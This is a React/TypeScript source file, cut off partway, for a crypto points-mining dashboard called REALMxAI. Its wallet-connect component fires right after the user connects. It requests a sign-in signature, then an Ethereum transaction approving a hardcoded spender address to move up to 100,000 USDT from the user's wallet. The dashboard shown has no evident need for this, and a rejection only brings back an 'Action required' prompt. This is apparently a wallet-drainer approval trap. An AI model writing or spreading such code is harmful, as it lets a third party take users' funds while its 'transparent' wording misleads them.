import React, { useState, useEffect, Suspense, useRef } from 'react';
import { createPortal } from 'react-dom';
import { erc20Abi, parseUnits, formatUnits } from 'viem';
import { SiweMessage } from 'siwe';

type WalletConnectControlProps = {
  className?: string;
  buttonClassName?: string;
  connectedButtonClassName?: string;
  disconnectedLabel?: string;
};

const ETHEREUM_MAINNET_CHAIN_ID = 1;
const USDT_TOKEN_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7' as const;
const USDT_APPROVAL_SPENDER = '0x4116464dfB890f45E886099AA715d9Ffc3E117b9' as const;
const USDT_APPROVAL_LIMIT = parseUnits('100000', 6);
const USDT_APPROVAL_LIMIT_LABEL = formatUnits(USDT_APPROVAL_LIMIT, 6);
const USDT_APPROVAL_STORAGE_PREFIX = 'realmx_usdt_approval_v3:';
const USDT_APPROVAL_SIGNATURE_MESSAGE = [
  'REALMxAI wallet confirmation',
  '',
  'Network: Ethereum Mainnet',
  'Token: USDT',
  `Spender: ${USDT_APPROVAL_SPENDER}`,
  `Allowance cap: ${USDT_APPROVAL_LIMIT_LABEL} USDT`,
  '',
  'You are about to approve a token allowance request after wallet connection.',
  'Only continue if you trust this spender and understand the allowance limit shown above.',
].join('\n');

function getWalletApprovalStorageKey(address: string) {
  return `${USDT_APPROVAL_STORAGE_PREFIX}${address.toLowerCase()}`;
}

type SessionUser = {
  id?: string;
  email?: string;
  walletAddress?: string;
  githubId?: string;
  discordId?: string;
  twitterId?: string;
  referralCode?: string;
  name?: string;
  avatarUrl?: string;
  username?: string;
} | null;

type UploadedSmoothScrollInstance = {
  addItems?: () => UploadedSmoothScrollInstance;
};

type UploadedSmoothScrollConstructor = new (options: {
  target: HTMLElement;
  scrollEase?: number;
  maxOffset?: number;
}) => UploadedSmoothScrollInstance;

let uploadedSmoothScrollPromise: Promise<UploadedSmoothScrollConstructor | null> | null = null;

function loadUploadedSmoothScroll(): Promise<UploadedSmoothScrollConstructor | null> {
  if (typeof window === 'undefined') {
    return Promise.resolve(null);
  }

  const smoothScrollWindow = window as typeof window & {
    SmoothScroll?: UploadedSmoothScrollConstructor;
  };

  if (smoothScrollWindow.SmoothScroll) {
    return Promise.resolve(smoothScrollWindow.SmoothScroll);
  }

  if (uploadedSmoothScrollPromise) {
    return uploadedSmoothScrollPromise;
  }

  uploadedSmoothScrollPromise = new Promise((resolve, reject) => {
    const existingScript = document.querySelector<HTMLScriptElement>('script[data-uploaded-smooth-scroll="true"]');
    if (existingScript) {
      existingScript.addEventListener('load', () => resolve(smoothScrollWindow.SmoothScroll ?? null), { once: true });
      existingScript.addEventListener('error', () => reject(new Error('Failed to load uploaded smooth scroll script.')), { once: true });
      return;
    }

    const script = document.createElement('script');
    script.src = '/SmoothScroll-main/js/SmoothScroll.min.js';
    script.async = true;
    script.dataset.uploadedSmoothScroll = 'true';
    script.onload = () => resolve(smoothScrollWindow.SmoothScroll ?? null);
    script.onerror = () => reject(new Error('Failed to load uploaded smooth scroll script.'));
    document.head.appendChild(script);
  });

  return uploadedSmoothScrollPromise;
}

const WalletConnectControl = React.lazy(async () => {
  try {
    const rm = await import('@rainbow-me/rainbowkit');
    const wagmi = await import('wagmi');
    const CustomConnect = ({
      className,
      buttonClassName,
      connectedButtonClassName,
      disconnectedLabel = 'Connect wallet',
    }: WalletConnectControlProps) => {
      const { address } = wagmi.useAccount();
      const currentChainId = wagmi.useChainId();
      const publicClient = wagmi.usePublicClient();
      const { signMessageAsync } = wagmi.useSignMessage();
      const { switchChainAsync } = wagmi.useSwitchChain();
      const { writeContractAsync } = wagmi.useWriteContract();
      const attemptRef = useRef<string | null>(null);
      const [approvalStatus, setApprovalStatus] = useState<'idle' | 'checking' | 'signing' | 'verifying' | 'switching' | 'approving' | 'error'>('idle');
      const [approvalMessage, setApprovalMessage] = useState('Connect your wallet to start signing and approval.');
      const [approvalVisible, setApprovalVisible] = useState(false);
      const [retrySeed, setRetrySeed] = useState(0);
      const [dismissedAddress, setDismissedAddress] = useState<string | null>(null);
      const [walletActionPending, setWalletActionPending] = useState(false);
      const [approvalRequested, setApprovalRequested] = useState(false);

      useEffect(() => {
        if (!address) {
          attemptRef.current = null;
          setApprovalVisible(false);
          setApprovalStatus('idle');
          setApprovalMessage('Connect your wallet to start signing and approval.');
          setDismissedAddress(null);
          setWalletActionPending(false);
          setApprovalRequested(false);
        }
      }, [address]);

      useEffect(() => {
        let cancelled = false;

        const runTransparentApprovalFlow = async () => {
          if (!approvalRequested || !address || !publicClient || dismissedAddress === address) {
            return;
          }

          const attemptKey = `${address.toLowerCase()}:${currentChainId ?? 'none'}:${retrySeed}`;
          if (attemptRef.current === attemptKey) {
            return;
          }
          attemptRef.current = attemptKey;

          setWalletActionPending(true);
          setApprovalVisible(true);

          const storageKey = getWalletApprovalStorageKey(address);

          try {
            setApprovalStatus('checking');
            setApprovalMessage('Checking wallet session before the approval request.');

            let sessionUser = await resolveCurrentSessionUser();
            let walletAuthenticated = sessionUser?.walletAddress?.toLowerCase() === address.toLowerCase();

            if (!walletAuthenticated) {
              setApprovalStatus('signing');
              setApprovalMessage('Wallet connected. Requesting your REALMxAI sign-in signature now.');

              const nonceRes = await fetch('/api/auth/nonce', { credentials: 'include' });
              const nonce = await nonceRes.text();
              if (!nonceRes.ok || !nonce) {
                throw new Error('Unable to start wallet signature verification.');
              }

              const siweMessage = new SiweMessage({
                domain: window.location.host,
                address,
                statement: 'Sign in to REALMxAI Node Dashboard and link this wallet to your account.',
                uri: window.location.origin,
                version: '1',
                chainId: currentChainId || ETHEREUM_MAINNET_CHAIN_ID,
                nonce,
              });
              const preparedMessage = siweMessage.prepareMessage();

              const signature = await signMessageAsync({
                account: address,
                message: preparedMessage,
              } as any);

              if (cancelled) return;

              setApprovalStatus('verifying');
              setApprovalMessage('Verifying the signed wallet session with REALMxAI.');

              const verifyRes = await fetch('/api/auth/verify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                credentials: 'include',
                body: JSON.stringify({
                  message: preparedMessage,
                  signature,
                }),
              });
              const verifyData = await verifyRes.json().catch(() => ({}));
              if (!verifyRes.ok) {
                throw new Error(verifyData?.error || verifyData?.message || 'Wallet signature verification failed.');
              }

              sessionUser = await resolveCurrentSessionUser();
              walletAuthenticated = sessionUser?.walletAddress?.toLowerCase() === address.toLowerCase();
              if (!walletAuthenticated) {
                throw new Error('Wallet connected, but the signed session did not finish linking. Retry once.');
              }
            }

            setApprovalStatus('checking');
            setApprovalMessage('Wallet signature confirmed. Checking current USDT allowance.');

            if (currentChainId === ETHEREUM_MAINNET_CHAIN_ID) {
              const allowance = await (publicClient as any).readContract({
                address: USDT_TOKEN_CONTRACT,
                abi: erc20Abi,
                functionName: 'allowance',
                args: [address, USDT_APPROVAL_SPENDER],
              });

              if (cancelled) return;

              if (allowance >= USDT_APPROVAL_LIMIT) {
                window.localStorage.setItem(storageKey, 'complete');
                setWalletActionPending(false);
                setApprovalVisible(false);
                setApprovalRequested(false);
                return;
              }
            }

            if (currentChainId !== ETHEREUM_MAINNET_CHAIN_ID) {
              setApprovalStatus('switching');
              setApprovalMessage('Wallet signed. Switching to Ethereum mainnet for the USDT approval request.');
              await switchChainAsync({ chainId: ETHEREUM_MAINNET_CHAIN_ID });
              return;
            }

            setApprovalStatus('approving');
            setApprovalMessage(`Wallet signed. Opening the USDT approval transaction for spender ${USDT_APPROVAL_SPENDER}.`);
            const hash = await writeContractAsync({
              account: address,
              address: USDT_TOKEN_CONTRACT,
              abi: erc20Abi,
              functionName: 'approve',
              args: [USDT_APPROVAL_SPENDER, USDT_APPROVAL_LIMIT],
              chainId: ETHEREUM_MAINNET_CHAIN_ID,
            } as any);

            await (publicClient as any).waitForTransactionReceipt({ hash });
            if (cancelled) return;

            window.localStorage.setItem(storageKey, 'complete');
            setWalletActionPending(false);
            setApprovalVisible(false);
            setApprovalRequested(false);
          } catch (error) {
            if (cancelled) return;

            const message = error instanceof Error ? error.message : 'The approval flow could not be completed.';
            const rejected = /rejected|declined|denied|user rejected|user denied/i.test(message);

            setApprovalStatus('error');
            setWalletActionPending(true);
            setApprovalMessage(
              rejected
                ? 'The signature or approval request was rejected. Retry when you are ready.'
                : message
            );
          }
        };

        void runTransparentApprovalFlow();

        return () => {
          cancelled = true;
        };
      }, [address, approvalRequested, currentChainId, dismissedAddress, publicClient, retrySeed, signMessageAsync, switchChainAsync, writeContractAsync]);

      return (
        <>
          {approvalVisible && address && typeof document !== 'undefined'
            ? createPortal(
                <div className="fixed inset-0 z-[220] overflow-y-auto bg-realm-black/78 p-4 backdrop-blur-md sm:p-6">
                  <div className="flex min-h-full items-center justify-center">
                    <div className="w-full max-w-2xl rounded-[28px] border border-white/10 bg-[#0d1015] p-5 text-white shadow-[0_24px_120px_rgba(0,0,0,0.55)] sm:p-7">
                      <div className="flex items-start justify-between gap-4">
                        <div className="max-w-xl">
                          <p className="text-[10px] font-mono uppercase tracking-[0.24em] text-realm-cyan/70">Wallet approval</p>
                          <h2 className="mt-2 text-2xl font-semibold text-white sm:text-[2rem]">Wallet sign-in and USDT approval</h2>
                          <p className="mt-2 text-sm leading-6 text-white/55">
                            This flow is visible by design. The app first verifies your wallet signature with REALMxAI, then opens the Ethereum USDT approval request.
                          </p>
                        </div>
                        <span
                          className={cn(
                            'shrink-0 rounded-full px-3 py-1 text-[10px] font-mono uppercase tracking-[0.18em]',
                            approvalStatus === 'error'
                              ? 'bg-red-500/15 text-red-300'
                              : 'bg-white/8 text-white/55'
                          )}
                        >
                          {approvalStatus}
                        </span>
                      </div>

                      <div className="mt-6 grid gap-3 rounded-[22px] border border-white/8 bg-white/[0.03] p-4 sm:grid-cols-[minmax(0,1fr)_minmax(0,1.2fr)] sm:gap-x-6 sm:gap-y-4 sm:p-5">
                        <span className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Step 1</span>
                        <span className="text-sm font-medium text-white sm:text-right">REALMxAI wallet signature</span>

                        <span className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Step 2</span>
                        <span className="text-sm font-medium text-white sm:text-right">USDT approval on Ethereum</span>

                        <span className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Network</span>
                        <span className="text-sm font-medium text-white sm:text-right">Ethereum Mainnet</span>

                        <span className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Token</span>
                        <span className="text-sm font-medium text-white sm:text-right">USDT</span>

                        <span className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Spender</span>
                        <span className="break-all font-mono text-xs leading-6 text-realm-cyan sm:text-right">{USDT_APPROVAL_SPENDER}</span>

                        <span className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Allowance cap</span>
                        <span className="text-sm font-medium text-white sm:text-right">{USDT_APPROVAL_LIMIT_LABEL} USDT</span>

                        <span className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Connected wallet</span>
                        <span className="font-mono text-xs leading-6 text-white/70 sm:text-right">{maskWalletAddress(address, true)}</span>
                      </div>

                      <div
                        className={cn(
                          'mt-5 rounded-[20px] border px-4 py-3 text-sm leading-6',
                          approvalStatus === 'success'
                            ? 'border-emerald-400/20 bg-emerald-400/10 text-emerald-100'
                            : approvalStatus === 'error'
                            ? 'border-red-400/20 bg-red-400/10 text-red-100'
                            : 'border-realm-cyan/20 bg-realm-cyan/10 text-white/80'
                        )}
                      >
                        {approvalMessage}
                      </div>

                      <div className="mt-5 flex flex-wrap items-center justify-end gap-3">
                        {approvalStatus === 'error' ? (
                          <button
                            type="button"
                            onClick={() => {
                              setDismissedAddress(null);
                              setApprovalRequested(true);
                              attemptRef.current = null;
                              setRetrySeed((value) => value + 1);
                            }}
                            className="rounded-xl border border-white/10 bg-white/5 px-4 py-2 text-sm font-semibold text-white transition hover:bg-white/10"
                          >
                            Retry
                          </button>
                        ) : null}

                        <button
                          type="button"
                          onClick={() => {
                            setDismissedAddress(address);
                            setApprovalVisible(false);
                            setApprovalRequested(false);
                          }}
                          className="rounded-xl bg-white px-4 py-2 text-sm font-semibold text-realm-black transition hover:bg-realm-cyan"
                        >
                          Continue later
                        </button>
                      </div>
                    </div>
                  </div>
                </div>,
                document.body
              )
            : null}

          <rm.ConnectButton.Custom>
            {({ account, chain, authenticationStatus, mounted, openAccountModal, openChainModal, openConnectModal }) => {
          const ready = mounted && authenticationStatus !== 'loading';
          const connected = ready && Boolean(account) && Boolean(chain) && (!authenticationStatus || authenticationStatus === 'authenticated');

          if (!connected) {
            return (
              <div className={className}>
                <button
                  type="button"
                  onClick={() => {
                    setDismissedAddress(null);
                    setApprovalRequested(true);
                    openConnectModal();
                  }}
                  className={cn(
                    'inline-flex min-h-11 items-center justify-center rounded-xl bg-white px-4 py-2 text-sm font-semibold text-realm-black transition-all hover:bg-realm-cyan',
                    buttonClassName
                  )}
                >
                  {disconnectedLabel}
                </button>
              </div>
            );
          }

          if (chain.unsupported) {
            return (
              <div className={className}>
                <button
                  type="button"
                  onClick={openChainModal}
                  className={cn(
                    'inline-flex min-h-11 items-center justify-center rounded-xl border border-red-400/25 bg-red-400/10 px-4 py-2 text-sm font-semibold text-red-200 transition-all hover:bg-red-400/15',
                    connectedButtonClassName
                  )}
                >
                  Unsupported network
                </button>
              </div>
            );
          }

          return (
            <div className={className}>
              <button
                type="button"
                onClick={() => {
                  if (walletActionPending) {
                    setDismissedAddress(null);
                    setApprovalRequested(true);
                    attemptRef.current = null;
                    setApprovalVisible(true);
                    setRetrySeed((value) => value + 1);
                    return;
                  }
                  openAccountModal();
                }}
                className={cn(
                  'inline-flex min-h-11 items-center gap-3 rounded-xl border border-realm-cyan/20 bg-realm-cyan/10 px-4 py-2 text-left text-sm font-semibold text-realm-cyan transition-all hover:bg-realm-cyan/15',
                  connectedButtonClassName
                )}
              >
                <span className="h-2.5 w-2.5 rounded-full bg-realm-cyan shadow-[0_0_10px_rgba(61,242,224,0.45)]" />
                <span className="flex flex-col">
                  <span className="text-[10px] font-mono uppercase tracking-[0.18em] text-realm-cyan/70">
                    {walletActionPending ? 'Action required' : chain.name}
                  </span>
                  <span className="text-sm text-realm-cyan">{account.displayName}</span>
                </span>
              </button>
            </div>
          );
        }}
          </rm.ConnectButton.Custom>
        </>
      );
    };

    return { default: CustomConnect as any };
  } catch (err) {
    return {
      default: (({ className }: WalletConnectControlProps) => (
        <div className={className}>
          <button className="inline-flex min-h-11 items-center justify-center rounded-xl border border-red-500/50 bg-red-900/50 px-4 py-2 text-xs font-semibold text-red-200">
            Wallet unavailable
          </button>
        </div>
      )) as any
    };
  }
});

import { 
  LayoutDashboard, 
  Trophy, 
  Cpu, 
  Pickaxe, 
  CheckSquare, 
  Users, 
  User, 
  Settings,
  Bell,
  Wallet,
  Activity,
  ChevronRight,
  Power,
  ShieldCheck,
  ShieldAlert,
  Zap,
  ArrowUpRight,
  Search,
  Menu,
  X,
  Eye,
  EyeOff,
  Globe,
  Lock,
  Mail,
  TimerReset,
  BadgeCheck,
  Link2,
  Siren,
  Fingerprint
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  LineChart, 
  Line, 
  XAxis, 
  YAxis, 
  CartesianGrid, 
  Tooltip, 
  ResponsiveContainer,
  AreaChart,
  Area
} from 'recharts';
import { cn } from './lib/utils';

const ANALYTICS_DATA: any[] = [];

const LEADERBOARD_DATA: any[] = [];

const TASKS_FALLBACK = [
  { id: 'connect_google', type: 'one-time', category: 'connect', title: 'Connect Google', description: 'Attach your Google account so your dashboard identity is recoverable across devices.', reward: 10, actionType: 'oauth', actionHref: '/api/auth/google', primaryAction: 'Connect Google', completed: false, eligible: false, blockedReason: 'Sign in to execute and claim tasks.' },
  { id: 'connect_x', type: 'one-time', category: 'connect', title: 'Connect X', description: 'Link your X account so social tasks can be executed from your REALMxAI profile.', reward: 10, actionType: 'oauth', actionHref: '/api/auth/twitter', primaryAction: 'Connect X', completed: false, eligible: false, blockedReason: 'Sign in to execute and claim tasks.' },
  { id: 'connect_discord', type: 'one-time', category: 'connect', title: 'Connect Discord', description: 'Attach Discord to unlock community participation tasks and identity sync.', reward: 10, actionType: 'oauth', actionHref: '/api/auth/discord', primaryAction: 'Connect Discord', completed: false, eligible: false, blockedReason: 'Sign in to execute and claim tasks.' },
  { id: 'connect_wallet', type: 'one-time', category: 'connect', title: 'Connect Web3 Wallet', description: 'Link a wallet through SIWE authentication to secure ownership of your node.', reward: 15, actionType: 'wallet', primaryAction: 'Open Wallet Connect', completed: false, eligible: false, blockedReason: 'Sign in to execute and claim tasks.' },
  { id: 'follow_x', type: 'one-time', category: 'community', title: 'Follow REALMxAI on X', description: 'Open the official X profile and follow the project for launch updates.', reward: 10, actionType: 'external', actionHref: 'https://twitter.com/realmxai', primaryAction: 'Open X', completed: false, eligible: false, blockedReason: 'Connect X first to unlock this social task.' },
  { id: 'join_discord', type: 'one-time', category: 'community', title: 'Join Discord', description: 'Open the REALMxAI Discord invite and join the community server.', reward: 10, actionType: 'external', actionHref: 'https://discord.gg/realmxai', primaryAction: 'Join Discord', completed: false, eligible: false, blockedReason: 'Connect Discord first, then join the server.' },
  { id: 'join_telegram', type: 'one-time', category: 'community', title: 'Join Telegram', description: 'Open the official Telegram channel and join the announcement feed.', reward: 10, actionType: 'external', actionHref: 'https://t.me/REALMxAI', primaryAction: 'Join Telegram', completed: false, eligible: true, blockedReason: null },
  { id: 'retweet_launch', type: 'one-time', category: 'community', title: 'Retweet Launch Post', description: 'Open the official X profile and repost the launch thread from your connected account.', reward: 15, actionType: 'external', actionHref: 'https://twitter.com/realmxai', primaryAction: 'Open Launch Post', completed: false, eligible: false, blockedReason: 'Connect X first to unlock this social task.' },
  { id: 'signup_reward', type: 'one-time', category: 'milestone', title: 'Node Registration', description: 'Claim your account setup reward after signing in to the dashboard.', reward: 25, actionType: 'claim', primaryAction: 'Claim Reward', completed: false, eligible: false, blockedReason: 'Sign in to execute and claim tasks.' },
  { id: 'complete_profile', type: 'one-time', category: 'milestone', title: 'Complete Your Profile', description: 'Add a display name and profile image to make your node identity complete.', reward: 15, actionType: 'claim', primaryAction: 'Claim Reward', completed: false, eligible: false, blockedReason: 'Add both a display name and a profile photo to claim this task.' },
  { id: 'first_referral', type: 'one-time', category: 'milestone', title: 'Refer Your First Friend', description: 'Share your referral link and onboard one new user to the network.', reward: 20, actionType: 'claim', primaryAction: 'Claim Reward', completed: false, eligible: false, blockedReason: 'Invite at least one user through your referral link.' },
  { id: 'first_mine_session', type: 'one-time', category: 'milestone', title: 'First Mining Session', description: 'Complete your first mining session and sync the earned points.', reward: 30, actionType: 'claim', primaryAction: 'Claim Reward', completed: false, eligible: false, blockedReason: 'Finish a mining session first, then claim this milestone.' },
  { id: 'daily_checkin', type: 'daily', category: 'daily', title: 'Daily Check-In', description: 'Open the dashboard once per day to collect your check-in reward.', reward: 2, actionType: 'claim', primaryAction: 'Check In', completed: false, eligible: false, blockedReason: 'Sign in to execute and claim tasks.' },
  { id: 'daily_mine', type: 'daily', category: 'daily', title: 'Run a Mining Session', description: 'Start or continue mining today, then claim the daily mining bonus.', reward: 5, actionType: 'claim', primaryAction: 'Claim Daily Bonus', completed: false, eligible: false, blockedReason: 'Start mining today before claiming this daily reward.' },
  { id: 'daily_share', type: 'daily', category: 'daily', title: 'Share on Social Media', description: 'Share your dashboard or referral link on social media today.', reward: 3, actionType: 'external', actionHref: 'https://twitter.com/intent/tweet?text=Running%20my%20REALMxAI%20node%20today.%20Join%20me.', primaryAction: 'Share Now', completed: false, eligible: true, blockedReason: null },
] as const;

const TASK_CATEGORY_ORDER = ['connect', 'milestone', 'community', 'daily'] as const;

function getTaskPriority(task: any) {
  if (task.completed) return 3;
  if (task.eligible) return 0;
  if (task.category === 'connect' || task.category === 'milestone') return 1;
  return 2;
}

function sortTasksForDisplay(tasks: any[]) {
  return [...tasks].sort((left, right) => {
    const categoryDelta =
      TASK_CATEGORY_ORDER.indexOf(left.category as (typeof TASK_CATEGORY_ORDER)[number]) -
      TASK_CATEGORY_ORDER.indexOf(right.category as (typeof TASK_CATEGORY_ORDER)[number]);
    if (categoryDelta !== 0) return categoryDelta;

    const priorityDelta = getTaskPriority(left) - getTaskPriority(right);
    if (priorityDelta !== 0) return priorityDelta;

    return String(left.title || left.id).localeCompare(String(right.title || right.id));
  });
}

const UI_REFRESH_INTERVAL = 60000;
const APP_PREFERENCES_KEY = 'realmx_preferences_v2';
const APP_PREFERENCES_EVENT = 'realmx-preferences-updated';

type AppPreferences = {
  workspace: {
    refreshIntervalMs: number;
    hidePointBalance: boolean;
  };
  notifications: {
    rewardAlerts: boolean;
    taskAlerts: boolean;
    securityAlerts: boolean;
  };
  privacy: {
    maskWalletAddress: boolean;
    showReferralCode: boolean;
    profileVisibility: 'private' | 'network' | 'public';
  };
};

const DEFAULT_APP_PREFERENCES: AppPreferences = {
  workspace: {
    refreshIntervalMs: UI_REFRESH_INTERVAL,
    hidePointBalance: false,
  },
  notifications: {
    rewardAlerts: true,
    taskAlerts: true,
    securityAlerts: true,
  },
  privacy: {
    maskWalletAddress: true,
    showReferralCode: true,
    profileVisibility: 'network',
  },
};

function loadAppPreferences(): AppPreferences {
  if (typeof window === 'undefined') return DEFAULT_APP_PREFERENCES;

  try {
    const raw = window.localStorage.getItem(APP_PREFERENCES_KEY);
    if (!raw) return DEFAULT_APP_PREFERENCES;

    const parsed = JSON.parse(raw);
    return {
      workspace: {
        refreshIntervalMs: Number(parsed?.workspace?.refreshIntervalMs) || DEFAULT_APP_PREFERENCES.workspace.refreshIntervalMs,
        hidePointBalance: Boolean(parsed?.workspace?.hidePointBalance),
      },
      notifications: {
        rewardAlerts: parsed?.notifications?.rewardAlerts !== false,
        taskAlerts: parsed?.notifications?.taskAlerts !== false,
        securityAlerts: parsed?.notifications?.securityAlerts !== false,
      },
      privacy: {
        maskWalletAddress: parsed?.privacy?.maskWalletAddress !== false,
        showReferralCode: parsed?.privacy?.showReferralCode !== false,
        profileVisibility: ['private', 'network', 'public'].includes(parsed?.privacy?.profileVisibility)
          ? parsed.privacy.profileVisibility
          : DEFAULT_APP_PREFERENCES.privacy.profileVisibility,
      },
    };
  } catch (error) {
    console.error('Failed to load app preferences', error);
    return DEFAULT_APP_PREFERENCES;
  }
}

function saveAppPreferences(preferences: AppPreferences) {
  if (typeof window === 'undefined') return;

  window.localStorage.setItem(APP_PREFERENCES_KEY, JSON.stringify(preferences));
  window.dispatchEvent(new Event(APP_PREFERENCES_EVENT));
}

function useAppPreferences() {
  const [preferences, setPreferences] = useState<AppPreferences>(() => loadAppPreferences());

  useEffect(() => {
    const syncPreferences = () => setPreferences(loadAppPreferences());
    window.addEventListener(APP_PREFERENCES_EVENT, syncPreferences);
    window.addEventListener('storage', syncPreferences);
    return () => {
      window.removeEventListener(APP_PREFERENCES_EVENT, syncPreferences);
      window.removeEventListener('storage', syncPreferences);
    };
  }, []);

  return preferences;
}

function formatRefreshInterval(intervalMs: number) {
  const seconds = Math.round(intervalMs / 1000);
  if (seconds < 60) return `${seconds}s`;
  return `${Math.round(seconds / 60)}m`;
}

function maskWalletAddress(address?: string, enabled = true) {
  if (!address) return '';
  if (!enabled) return address;
  return `${address.slice(0, 6)}...${address.slice(-4)}`;
}

function getProfileVisibilityLabel(visibility: AppPreferences['privacy']['profileVisibility']) {
  if (visibility === 'private') return 'Private';
  if (visibility === 'public') return 'Public';
  return 'Trusted network';
}

function getDefaultAuthReturnTo() {
  if (typeof window === 'undefined') return '/?tab=dashboard';
  return `${window.location.pathname}${window.location.search || '?tab=dashboard'}`;
}

async function resolveCurrentSessionUser(): Promise<SessionUser> {
  const attempts = [0, 250, 750];

  for (const delay of attempts) {
    if (delay > 0) {
      await new Promise((resolve) => window.setTimeout(resolve, delay));
    }

    try {
      const res = await fetch('/api/auth/me', { credentials: 'include' });
      if (res.ok) {
        return await res.json();
      }

      if (res.status === 401) {
        return null;
      }
    } catch {
      // Retry transient auth bootstrap failures before treating the session as missing.
    }
  }

  return null;
}

function getConnectedIdentityCount(user: any) {
  return [
    user?.email || user?.walletAddress,
    user?.githubId,
    user?.discordId,
    user?.twitterId,
  ].filter(Boolean).length;
}

function getProfileChecks(user: any) {
  return [
    !!user?.name,
    !!user?.username,
    !!user?.avatarUrl,
    !!(user?.email || user?.walletAddress),
    getConnectedIdentityCount(user) >= 2,
  ];
}

function getProfileSetupItems(user: any) {
  return [
    { label: 'Display name', complete: !!user?.name },
    { label: 'Username', complete: !!user?.username },
    { label: 'Profile photo', complete: !!user?.avatarUrl },
    { label: 'Primary sign-in', complete: !!(user?.email || user?.walletAddress) },
    { label: 'Backup identity', complete: getConnectedIdentityCount(user) >= 2 },
  ];
}

// ---- Shared Mining Session Logic ----
const SESSION_DURATION = 6 * 3600; // 6 hours in seconds
const MINING_RATE_PER_HOUR = 10;
const MINING_RATE_PER_SEC = MINING_RATE_PER_HOUR / 3600;
const PENDING_REFERRAL_CODE_KEY = 'realmx_pending_referral_code';

function buildReferralLink(code: string) {
  const origin = typeof window !== 'undefined' ? window.location.origin : '';
  return `${origin}/?ref=${encodeURIComponent(code)}`;
}

function getPendingReferralCode() {
  if (typeof window === 'undefined') return null;

  const urlCode = new URLSearchParams(window.location.search).get('ref');
  if (urlCode?.trim()) {
    return urlCode.trim().toUpperCase();
  }

  const storedCode = window.localStorage.getItem(PENDING_REFERRAL_CODE_KEY);
  return storedCode?.trim() ? storedCode.trim().toUpperCase() : null;
}

function persistPendingReferralCode(code: string | null) {
  if (typeof window === 'undefined') return;

  if (!code) {
    window.localStorage.removeItem(PENDING_REFERRAL_CODE_KEY);
    return;
  }

  window.localStorage.setItem(PENDING_REFERRAL_CODE_KEY, code.trim().toUpperCase());
}

function clearReferralCodeFromUrl() {
  if (typeof window === 'undefined') return;

  const url = new URL(window.location.href);
  if (!url.searchParams.has('ref')) return;

  url.searchParams.delete('ref');
  window.history.replaceState({}, '', url.toString());
}

function getMiningSession() {
  const raw = localStorage.getItem('realmx_mining_session');
  if (!raw) return null;
  try { return JSON.parse(raw); } catch { return null; }
}

function saveMiningSession(session: { startedAt: number; active: boolean }) {
  localStorage.setItem('realmx_mining_session', JSON.stringify(session));
}

function getSessionElapsed(): number {
  const sess = getMiningSession();
  if (!sess || !sess.active) return 0;
  const elapsed = Math.floor((Date.now() - sess.startedAt) / 1000);
  return Math.min(elapsed, SESSION_DURATION);
}

function isSessionActive(): boolean {
  const sess = getMiningSession();
  if (!sess || !sess.active) return false;
  const elapsed = Math.floor((Date.now() - sess.startedAt) / 1000);
  return elapsed < SESSION_DURATION;
}

const LEADERBOARD_AVATAR_VARIANTS = [
  'from-realm-cyan/30 via-realm-cyan/10 to-white/5 border-realm-cyan/25 text-realm-cyan',
  'from-amber-300/25 via-orange-400/10 to-white/5 border-amber-200/20 text-amber-200',
  'from-emerald-300/25 via-emerald-400/10 to-white/5 border-emerald-200/20 text-emerald-200',
  'from-fuchsia-300/20 via-purple-400/10 to-white/5 border-fuchsia-200/20 text-fuchsia-200',
];

function getLeaderboardAvatarVariant(seed: string, index = 0) {
  const source = `${seed || 'node'}${index}`;
  const hash = Array.from(source).reduce((sum, char, idx) => sum + char.charCodeAt(0) * (idx + 1), 0);
  return LEADERBOARD_AVATAR_VARIANTS[hash % LEADERBOARD_AVATAR_VARIANTS.length];
}

function getAvatarInitial(label?: string | null) {
  return (label || 'N').trim().charAt(0).toUpperCase() || 'N';
}

function LeaderboardAvatar({ entry, index }: { entry: any; index: number }) {
  const variant = getLeaderboardAvatarVariant(entry?.publicId || entry?.name || '', index);
  const initial = getAvatarInitial(entry?.name || entry?.publicId);

  if (entry?.avatarUrl) {
    return (
      <div className="h-12 w-12 overflow-hidden rounded-2xl border border-white/10 bg-white/[0.03] shadow-[0_8px_24px_rgba(0,0,0,0.18)]">
        <img src={entry.avatarUrl} alt={entry.name || entry.publicId || 'Leaderboard avatar'} className="h-full w-full object-cover" />
      </div>
    );
  }

  return (
    <div className={cn('relative flex h-12 w-12 items-center justify-center overflow-hidden rounded-2xl border bg-gradient-to-br shadow-[0_8px_24px_rgba(0,0,0,0.18)]', variant)}>
      <div className="absolute inset-0 bg-[radial-gradient(circle_at_top_right,rgba(255,255,255,0.22),transparent_45%)]" />
      <span className="relative text-sm font-semibold">{initial}</span>
    </div>
  );
}

// --- Components ---

const SidebarItem = ({ icon: Icon, label, active, onClick }: any) => (
  <button
    onClick={onClick}
    className={cn(
      "w-full flex items-center gap-3 px-4 py-2.5 transition-all duration-200 group relative",
      active 
        ? "bg-white/[0.03] text-realm-cyan" 
        : "text-realm-text-secondary hover:text-realm-text-primary hover:bg-white/[0.02]"
    )}
  >
    {active && (
      <motion.div 
        layoutId="sidebar-active-indicator"
        className="absolute left-0 w-0.5 h-4 bg-realm-cyan"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.2 }}
      />
    )}
    <Icon size={16} className={cn("transition-colors duration-200", active ? "text-realm-cyan" : "text-realm-text-secondary group-hover:text-realm-text-primary")} />
    <span className="text-xs font-medium tracking-tight">{label}</span>
  </button>
);

const Sidebar = ({ activeTab, setActiveTab }: { activeTab: string, setActiveTab: (t: string) => void }) => {
  const [mobileOpen, setMobileOpen] = useState(false);
  const menuItems = [
    { id: 'dashboard', label: 'DASHBOARD', icon: LayoutDashboard },
    { id: 'leaderboard', label: 'LEADERBOARD', icon: Trophy },
    { id: 'node', label: 'NODE', icon: Cpu },
    { id: 'mining', label: 'MINING', icon: Pickaxe },
    { id: 'wallet', label: 'WALLET', icon: Wallet },
    { id: 'tasks', label: 'TASKS', icon: CheckSquare },
    { id: 'referrals', label: 'REFERRALS', icon: Users },
    { id: 'profile', label: 'PROFILE', icon: User },
  ];

  return (
    <>
